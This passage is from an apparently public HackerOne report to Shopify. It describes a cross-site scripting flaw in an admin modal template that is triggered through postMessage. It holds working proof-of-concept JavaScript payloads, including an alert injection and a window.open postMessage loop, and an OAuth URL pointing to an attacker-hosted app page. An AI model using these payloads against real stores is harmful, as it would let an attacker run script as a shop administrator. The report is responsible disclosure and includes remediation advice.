class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePutting this all together with the SDK we get the following script:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparent\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epostMessage\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n  \u003cspan class=\"na\"\u003emessage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eShopify.API.Modal.input\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"na\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"na\"\u003emessage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"na\"\u003emessage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \n      \u003cspan class=\"na\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;-alert(document.domain)-\u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e*\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"exploitability\"\u003eExploitability\u003c/h1\u003e\n\n\u003cp\u003eYou need to convince an administrator to authorize your malicious application, however the exploit does not require any specific permissions to trigger so an admin may be more willing to authorize the application. \u003c/p\u003e\n\n\u003ch1 id=\"proof-of-concept\"\u003eProof of Concept\u003c/h1\u003e\n\n\u003cp\u003eI\u0026#39;ve created an example malicious application associated with my partner account \u003ccode\u003eshopify-whitehat-1@bored.engineer\u003c/code\u003e to demonstrate the issue...\u003cbr\u003e\nOpen the following URL on on \u003ccode\u003e$your-shop$.myshopify.com\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/admin/oauth/authorize?client_id=5b7bd427b8caa69610bf85d1c87d4a04\u0026amp;scope=read_products\u0026amp;redirect_uri=https://attackerdoma.in/a4d76231-8657-48ed-8800-f1b02c7bb2ff.html\u0026amp;state=nonce\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter authorizing the application an alert should appear on the \u003ccode\u003e/admin\u003c/code\u003e window containing \u003ccode\u003edocument.domain\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch1 id=\"remediation\"\u003eRemediation\u003c/h1\u003e\n\n\u003cp\u003eThe \u0026quot;input\u0026quot; template should be updated to make the \u003ccode\u003evalue\u003c/code\u003e parameter context-aware, perhaps wrapping in a \u003ccode\u003eJSON.stringify\u003c/code\u003e call.\u003c/p\u003e\n","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":30,"voters":["cdl","secator","michiel","dawgyg","bl4de","bogdantcaciuc","spam404","gerben_javado","glc","ysx","and 20 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1580768,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I wanted to add a quick note to this one, technically this issue doesn't require an admin to install a malicious application to be exploited. If a bad actor were already aware that an administrator uses an application hosted on `example.com`, they could search for XSS issues on `example.com` and using a combination of `var win = window.open(\"$shop$.myshopify.com/admin/apps/$id\")` and `win.postMessage` from the XSS they could likely trigger this issue. I hesitate to even mention this as is a very contrived example, however it's worth mentioning as normally XSS on the application domain wouldn't have much impact with the app being iframed to a specific URL on the application domain.","markdown_message":"\u003cp\u003eI wanted to add a quick note to this one, technically this issue doesn\u0026#39;t require an admin to install a malicious application to be exploited. If a bad actor were already aware that an administrator uses an application hosted on \u003ccode\u003eexample.com\u003c/code\u003e, they could search for XSS issues on \u003ccode\u003eexample.com\u003c/code\u003e and using a combination of \u003ccode\u003evar win = window.open(\u0026quot;$shop$.myshopify.com/admin/apps/$id\u0026quot;)\u003c/code\u003e and \u003ccode\u003ewin.postMessage\u003c/code\u003e from the XSS they could likely trigger this issue. I hesitate to even mention this as is a very contrived example, however it\u0026#39;s worth mentioning as normally XSS on the application domain wouldn\u0026#39;t have much impact with the app being iframed to a specific URL on the application domain.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-03T15:58:47.520Z","updated_at":"2017-04-03T15:58:47.520Z","actor":{"username":"bored-engineer","cleared":false,"url":"/bored-engineer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/328/c56b0e4e98b2bb24781c0cbec9ab8cd23be36b5f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1580855,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"To provide a PoC for the scenario described in my previous comment, consider a shop that has the \"Product Reviews\" application installed which is hosted on [productreviews.shopifyapps.com](https://productreviews.shopifyapps.com/). Normally, if I were to discover XSS on a specific endpoint such as [/XSS](https://productreviews.shopifyapps.com/XSS) it wouldn't directly affect the app since a specific endpoint is loaded within the administrative interface, not the endpoint with my XSS. Ignoring that this isn't quite true due to the proxy configuration of this specific app, I would be able to use this XSS to target a specific shop. If you open any URL on [productreviews.shopifyapps.com](https://productreviews.shopifyapps.com/) and run the following JS in the console (to simulate another XSS issue) it will fire an alert in the admin panel:\n```js\nvar win = window.open(\"https://$shop$.myshopify.com/admin/apps/product-reviews/\");\nsetInterval(function() {\n  win.postMessage(JSON.stringify({\n    message: \"Shopify.API.Modal.input\",\n    data: {\n      message: {\n        message: \"\", \n        value: \"'-alert(document.domain)-'\",\n      }\n    }\n  }), \"*\");\n}, 100);\n```\nThe core issue here is the still twine injection, however you may want to consider adding an additional verification step to the `window.onmessage` handler in the admin interface. One way to accomplish this would be to provide a secret (randomly generated) to the app when first initializing, then requiring all postMessage calls from the app include this secret before being evaluated, thereby assuring all messages originated from the app's iframe. ","markdown_message":"\u003cp\u003eTo provide a PoC for the scenario described in my previous comment, consider a shop that has the \u0026quot;Product Reviews\u0026quot; application installed which is hosted on \u003ca href=\"/redirect?url=https%3A%2F%2Fproductreviews.shopifyapps.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eproductreviews.shopifyapps.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. Normally, if I were to discover XSS on a specific endpoint such as \u003ca href=\"/redirect?url=https%3A%2F%2Fproductreviews.shopifyapps.com%2FXSS\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e/XSS\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e it wouldn\u0026#39;t directly affect the app since a specific endpoint is loaded within the administrative interface, not the endpoint with my XSS. Ignoring that this isn\u0026#39;t quite true due to the proxy configuration of this specific app, I would be able to use this XSS to target a specific shop. If you open any URL on \u003ca href=\"/redirect?url=https%3A%2F%2Fproductreviews.shopifyapps.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eproductreviews.shopifyapps.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and run the following JS in the console (to simulate another XSS issue) it will fire an alert in the admin panel:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ewin\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttps://$shop$.myshopify.com/admin/apps/product-reviews/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003esetInterval\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003ewin\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epostMessage\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n    \u003cspan class=\"na\"\u003emessage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eShopify.API.Modal.input\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"na\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"na\"\u003emessage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"na\"\u003emessage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \n        \u003cspan class=\"na\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39;-alert(document.domain)-\u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}),\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e*\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"mi\"\u003e100\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe core issue here is the still twine injection, however you may want to consider adding an additional verification step to the \u003ccode\u003ewindow.onmessage\u003c/code\u003e handler in the admin interface. One way to accomplish this would be to provide a secret (randomly generated) to the app when first initializing, then requiring all postMessage calls from the app include this secret before being evaluated, thereby assuring all messages originated from the app\u0026#39;s iframe. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-03T16:24:10.841Z","updated_at":"2017-04-03T16:24:37.557Z","actor":{"username":"bored-engineer","cleared":false,"url":"/bored-engineer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/328/c56b0e4e98b2bb24781c0cbec9ab8cd23be36b5f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1581653,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report and the additional info! Our engineering team is investigating this issue.","markdown_message":"\u003cp\u003eThank you for your report and the additional info! Our engineering team is investigating this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-03T20:39:25.492Z","updated_at":"2017-04-03T20:39:25.492Z","actor":{"username":"jenn-shopify","cleared":false,"url":"/jenn-shopify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1656962,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report! This issue has been resolved.\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.","markdown_message":"\u003cp\u003eThanks again for your report! This issue has been resolved.\u003c/p\u003e\n\n\u003cp\u003eOur next round of bounty decisions will take place within two weeks, so we\u0026#39;ll be in touch with you again soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-05T17:50:14.275Z","updated_at":"2017-05-05T17:50:14.275Z","actor":{"username":"jenn-shopify","cleared":false,"url":"/jenn-shopify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bored-engineer","url":"/bored-engineer"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1708003,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"As usual, thanks for this detailed report. We've considered a few factors to set the reward amount for this one. The issue would not have been directly exploitable to an unauthenticated user (it requires another XSS on specific domains or control of a malicious app), however it's reasonable to think these conditions can be achieved with a bit of extra work by the attacker. Additionally, we reviewed other templates for similar issues while investigating a solution for this report.","markdown_message":"\u003cp\u003eAs usual, thanks for this detailed report. We\u0026#39;ve considered a few factors to set the reward amount for this one. The issue would not have been directly exploitable to an unauthenticated user (it requires another XSS on specific domains or control of a malicious app), however it\u0026#39;s reasonable to think these conditions can be achieved with a bit of extra work by the attacker. Additionally, we reviewed other templates for similar issues while investigating a solution for this report.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-29T19:12:50.447Z","updated_at":"2017-05-29T19:12:50.447Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"bored-engineer","url":"/bored-engineer"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1708004,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-29T19:13:01.098Z","updated_at":"2017-05-29T19:13:01.098Z","first_to_agree":true,"actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1721822,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-06-01T16:42:17.028Z","updated_at":"2017-06-01T16:42:17.028Z","actor":{"username":"bored-engineer","cleared":false,"url":"/bored-engineer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/328/c56b0e4e98b2bb24781c0cbec9ab8cd23be36b5f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1721823,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-06-01T16:42:17.072Z","updated_at":"2017-06-01T16:42:17.072Z","actor":{"username":"bored-engineer","cleared":false,"url":"/bored-engineer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/328/c56b0e4e98b2bb24781c0cbec9ab8cd23be36b5f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":4254,"category":"team","content":"This report demonstrated an XSS that could be exploited by a malicious application installed on a store to execute javascript as a store administrator. The cause of the XSS turned out to be improperly escaped user input in a lodash template.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThis report demonstrated an XSS that could be exploited by a malicious application installed on a store to execute javascript as a store administrator. The cause of the XSS turned out to be improperly escaped user input in a lodash template.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}